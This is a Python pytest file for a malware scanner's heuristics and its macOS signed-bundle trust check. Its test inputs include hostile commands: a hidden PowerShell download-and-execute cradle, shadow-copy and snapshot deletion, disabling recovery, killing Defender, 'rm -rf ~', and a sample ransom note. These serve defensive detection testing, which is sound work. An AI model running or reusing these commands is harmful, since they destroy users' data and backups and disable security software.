"""False-positive policy of the file scanner heuristics and the signed-bundle trust check."""
import hashlib
import os
import plistlib

import pytest

from sentry.scanner import heuristics as H
from sentry.scanner.signatures import SignatureDB
from sentry.scanner.trust import TrustChecker


@pytest.fixture(scope="module")
def sigdb():
    return SignatureDB()


# ---- scripts -------------------------------------------------------------------
def test_single_weak_indicators_are_ignored():
    # a shell-syntax lexer legitimately mentions these; they are weak on their own
    a = H.analyze_script(b"keywords = ['Invoke-Expression', 'IEX', 'DownloadString']\n")
    assert a.severity == "clean"
    a = H.analyze_script(b"var x = '" + b"A" * 300 + b"';\nconst rtl = '\xe2\x80\xae';\n")
    assert a.severity == "clean"


def test_dropper_made_of_weak_indicators_is_reported():
    s = (b"powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://x/a');"
         b"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QUJD'))\"")
    a = H.analyze_script(s)
    assert a.severity in ("medium", "high")


def test_strong_script_indicators():
    assert H.analyze_script(b"vssadmin delete shadows /all /quiet\n").severity == "high"
    assert H.analyze_script(b"tmutil deletelocalsnapshots /\nrm -rf ~\n").severity == "high"
    assert H.analyze_script(b"powershell -enc " + b"QUJD" * 20).severity == "medium"


def test_encoded_flag_needs_real_payload():
    # "-encoding" / "-enc" without a base64 blob is ordinary text
    assert H.analyze_script(b"curl --data-urlencode x -enc utf8 file\n").severity == "clean"


def test_kill_security_software_needs_real_process_name():
    assert H.analyze_script(b"taskkill /F /IM MsMpEng.exe\nvssadmin delete shadows").severity == "high"
    assert H.analyze_script(b"kill -9 $PID  # V3 compat\n").severity == "clean"


def test_jar_is_an_archive_not_a_script():
    assert H.detect_type(b"PK\x03\x04\x14\x00", ".jar") == "zip"
    assert H.detect_type(b"\x00\x00", ".jar") == "zip"
    assert H.detect_type(b"import os\n", ".py") == "script"


# ---- executables ----------------------------------------------------------------
def test_library_with_crypto_strings_is_clean():
    data = b"\xcf\xfa\xed\xfe" + b"EVP_EncryptInit AES_set_encrypt_key bitcoin 1BoatSLRHtKNngkdXEeobR76b53LETtpyT " * 3
    assert H.analyze_executable(data, "macho").severity == "clean"


def test_real_ransomware_strings_are_high():
    data = b"MZ" + b"\x00" * 100 + b"vssadmin delete shadows /all /quiet bcdedit /set {default} recoveryenabled no"
    assert H.analyze_executable(data, "pe").severity == "high"


def test_readme_filename_string_is_not_a_ransom_note():
    assert H.analyze_executable(b"\xcf\xfa\xed\xfe see README.txt for details", "macho").severity == "clean"
    a = H.analyze_executable(b"MZ" + b"HOW_TO_DECRYPT_FILES.txt vssadmin delete shadows", "pe")
    assert a.severity == "high"


# ---- ransomware artifacts ---------------------------------------------------------
def test_readme_and_lock_files_are_clean(sigdb):
    assert H.analyze_encrypted("/x/README.txt", b"This project builds a parser.\n" * 40, sigdb).severity == "clean"
    assert H.analyze_encrypted("/x/help.html", b"<html><body>Help</body></html>" * 40, sigdb).severity == "clean"
    assert H.analyze_encrypted("/x/flake.lock", b'{"nodes": {}}' * 100, sigdb).severity == "clean"
    assert H.analyze_encrypted("/x/db.sqlite.lock", b"", sigdb).severity == "clean"
    assert H.analyze_encrypted("/x/Verify.java", b"public class Verify {}\n" * 60, sigdb).severity == "clean"


def test_encrypted_document_is_high(sigdb):
    body = os.urandom(4096)
    assert H.analyze_encrypted("/x/report.docx.locked", body, sigdb).severity == "high"
    assert H.analyze_encrypted("/x/photo.jpg.xyz9", body, sigdb).severity in ("medium", "high")


def test_ransom_note_needs_wording(sigdb):
    note = (b"All your files have been encrypted! To decrypt your files you need the private key.\n"
            b"Pay 0.5 bitcoin within 72 hours or the price will double.\n")
    assert H.analyze_encrypted("/x/HOW_TO_DECRYPT_FILES.txt", note, sigdb).severity == "high"
    assert H.analyze_encrypted("/x/notes.txt", note, sigdb).severity == "high"
    assert H.analyze_encrypted("/x/HOW_TO_DECRYPT_FILES.txt", b"meeting notes\n" * 50, sigdb).severity == "clean"


def test_misnamed_jpeg_is_not_encrypted(sigdb):
    jpeg = b"\xff\xd8\xff\xe0\x00\x10JFIF" + os.urandom(4000)
    assert H.analyze_encrypted("/x/tip.png", jpeg, sigdb).severity == "clean"
    assert H.analyze_encrypted("/x/tip.png", os.urandom(4096), sigdb).severity == "medium"


# ---- signed bundle trust ---------------------------------------------------------
def _make_bundle(tmp_path, rel_files: dict[str, bytes]):
    contents = tmp_path / "Foo.app" / "Contents"
    (contents / "MacOS").mkdir(parents=True)
    (contents / "_CodeSignature").mkdir()
    (contents / "MacOS" / "foo").write_bytes(b"\xcf\xfa\xed\xfe" + b"\x00" * 64)
    (contents / "Info.plist").write_bytes(plistlib.dumps({"CFBundleExecutable": "foo"}))
    files2 = {}
    for rel, body in rel_files.items():
        f = contents / rel
        f.parent.mkdir(parents=True, exist_ok=True)
        f.write_bytes(body)
        files2[rel] = {"hash2": hashlib.sha256(body).digest()}
    (contents / "_CodeSignature" / "CodeResources").write_bytes(plistlib.dumps({"files2": files2}))
    return contents


def test_sealed_resource_in_signed_bundle_is_trusted(tmp_path, monkeypatch):
    body = b"powershell -enc " + b"QUJD" * 30
    contents = _make_bundle(tmp_path, {"Resources/a.js": body})
    tc = TrustChecker(enabled=True, platform="darwin")
    monkeypatch.setattr(tc, "_codesign_ok", lambda path, **kw: True)
    path = str(contents / "Resources" / "a.js")
    assert tc.is_trusted(path, "script", hashlib.sha256(body).hexdigest())


def test_modified_or_unlisted_file_is_not_trusted(tmp_path, monkeypatch):
    body = b"original"
    contents = _make_bundle(tmp_path, {"Resources/a.js": body})
    tc = TrustChecker(enabled=True, platform="darwin")
    monkeypatch.setattr(tc, "_codesign_ok", lambda path, **kw: True)
    tampered = contents / "Resources" / "a.js"
    tampered.write_bytes(b"evil")
    assert not tc.is_trusted(str(tampered), "script", hashlib.sha256(b"evil").hexdigest())
    dropped = contents / "Resources" / "dropped.sh"
    dropped.write_bytes(b"#!/bin/sh\nvssadmin delete shadows")
    assert not tc.is_trusted(str(dropped), "script", None)


def test_broken_bundle_signature_trusts_nothing(tmp_path, monkeypatch):
    body = b"x"
    contents = _make_bundle(tmp_path, {"Resources/a.js": body})
    tc = TrustChecker(enabled=True, platform="darwin")
    monkeypatch.setattr(tc, "_codesign_ok", lambda path, **kw: False)
    assert not tc.is_trusted(str(contents / "Resources" / "a.js"), "script", hashlib.sha256(body).hexdigest())


def test_disabled_checker_never_trusts(tmp_path):
    tc = TrustChecker(enabled=False, platform="darwin")
    assert not tc.is_trusted("/Applications/Safari.app/Contents/MacOS/Safari", "macho", None)


# ---- engine integration -------------------------------------------------------------
def test_scanner_skips_itself_and_reports_only_real_threats(cfg, tmp_path):
    from sentry.scanner import Scanner
    from sentry.whitelist import Whitelist
    d = tmp_path / "victim"
    d.mkdir()
    (d / "lexer.py").write_text("KEYWORDS = ['Invoke-Expression', 'IEX', 'DownloadString', 'bitcoin']\n")
    (d / "README.txt").write_text("how to build\n" * 20)
    (d / "report.docx.locked").write_bytes(os.urandom(8192))
    (d / "HOW_TO_DECRYPT_FILES.txt").write_text(
        "All your files have been encrypted. To decrypt your files buy the private key with bitcoin.\n")
    cfg.set("trust_signed_files", False)
    sc = Scanner(cfg, Whitelist(cfg))
    findings, stats = sc.scan_paths([str(d), os.path.dirname(H.__file__)])
    paths = {os.path.basename(f.path) for f in findings}
    assert paths == {"report.docx.locked", "HOW_TO_DECRYPT_FILES.txt"}
    assert not any("heuristics.py" in f.path for f in findings)


def _fake_run_cmd(verify_rc, verify_err, authority="Authority=Developer ID Application: X\nAuthority=Apple Root CA"):
    def run(args, timeout=0):
        if "--verify" in args:
            return verify_rc, "", verify_err
        return 0, "", authority
    return run


def test_bundle_with_changed_resources_but_authentic_seal_is_usable(tmp_path, monkeypatch):
    from sentry.scanner import trust as T
    body = b"original"
    contents = _make_bundle(tmp_path, {"Resources/a.js": body})
    tc = TrustChecker(enabled=True, platform="darwin")
    monkeypatch.setattr(T, "run_cmd", _fake_run_cmd(1, "x: a sealed resource is missing or invalid"))
    assert tc.is_trusted(str(contents / "Resources" / "a.js"), "script", hashlib.sha256(body).hexdigest())
    # ...but a Mach-O is judged on its own signature, so a failing verify is still untrusted
    assert not tc.is_trusted(str(contents / "MacOS" / "foo"), "macho", None)


def test_tampered_seal_is_rejected(tmp_path, monkeypatch):
    from sentry.scanner import trust as T
    body = b"original"
    contents = _make_bundle(tmp_path, {"Resources/a.js": body})
    tc = TrustChecker(enabled=True, platform="darwin")
    monkeypatch.setattr(T, "run_cmd", _fake_run_cmd(1, "x: invalid resource directory (directory or signature have been modified)"))
    assert not tc.is_trusted(str(contents / "Resources" / "a.js"), "script", hashlib.sha256(body).hexdigest())


def test_adhoc_signature_is_not_trusted(tmp_path, monkeypatch):
    from sentry.scanner import trust as T
    contents = _make_bundle(tmp_path, {})
    tc = TrustChecker(enabled=True, platform="darwin")
    monkeypatch.setattr(T, "run_cmd", _fake_run_cmd(0, "", authority="Signature=adhoc"))
    assert not tc.is_trusted(str(contents / "MacOS" / "foo"), "macho", None)
